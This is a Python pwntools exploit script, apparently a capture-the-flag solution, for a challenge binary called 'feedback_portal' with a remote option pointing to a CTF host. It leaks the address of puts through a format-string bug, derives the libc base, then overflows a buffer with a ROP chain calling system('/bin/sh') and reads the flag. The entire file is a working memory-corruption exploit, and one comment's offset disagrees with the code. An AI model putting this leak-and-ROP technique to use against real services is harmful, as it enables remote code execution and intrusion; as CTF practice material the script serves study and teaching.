#!/usr/bin/env python3
from pwn import *

# searching with GDB, we foound taht the offset to use in the format string attack to leak the libc_start_call_main is 25.
# we have also seen that inside the stack, there is __libc_start_main + 117

context.binary = elf = ELF('./feedback_portal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)\

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13513)
    else:
        return process(elf.path)

p = conn()

GOT_TARGET = elf.got['puts']

ADDRESS_OFFSET = 15

# Creiamo la stringa: "%7$s" + padding per arrivare a 8 byte
fmt_string = f"%{ADDRESS_OFFSET}$s".encode()
fmt_string = fmt_string.ljust(8, b'A') # Diventa b'%7$sAAAA' fill until 8 bytes

# the printf will take the 7th argument and read it as a string. the 7h argument is something we pass, so the puts address inside the got
payload_leak = flat(
    fmt_string,
    p64(GOT_TARGET)
)

p.recvuntil(b'name:\n')
p.sendline(payload_leak)

p.recvuntil(b'Hello, ')

# puts will print until a null byte.
leaked_bytes = p.recv(6) # libc a 64bit addresses are 6 byte long
leaked_puts = u64(leaked_bytes.ljust(8, b'\x00'))

log.info(f"Leaked puts@libc: {leaked_puts:#x}")

# 4. calculate libc base address
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {libc.address:#x}")

p.recvuntil(b'feedback:\n')

# rop chain 
RIP_OFFSET = 136

rop_libc = ROP(libc)
ret = rop_libc.find_gadget(['ret']).address
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret']).address
binsh = next(libc.search(b'/bin/sh\x00'))
system_addr = libc.symbols['system']

payload = flat(
    b'A' * RIP_OFFSET,
    p64(ret),
    p64(pop_rdi),
    p64(binsh),
    p64(system_addr)
)

p.send(payload)

sleep(0.5)
p.sendline(b'cat flag')
p.interactive()
